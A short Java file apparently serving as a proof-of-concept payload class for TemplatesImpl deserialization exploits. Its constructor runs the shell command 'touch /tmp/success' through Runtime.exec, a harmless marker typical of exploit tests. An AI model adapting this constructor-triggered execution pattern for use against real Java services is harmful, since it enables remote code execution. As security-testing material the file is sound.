import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class ExecTemplatesImpl {
    public void transform(DOM document, SerializationHandler[] handlers)
            throws TransletException {}

    public void transform(DOM document, DTMAxisIterator iterator,
                          SerializationHandler handler) throws TransletException {}

    public ExecTemplatesImpl() {
        super();

        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"touch", "/tmp/success"};
            Process pc = null;
            pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
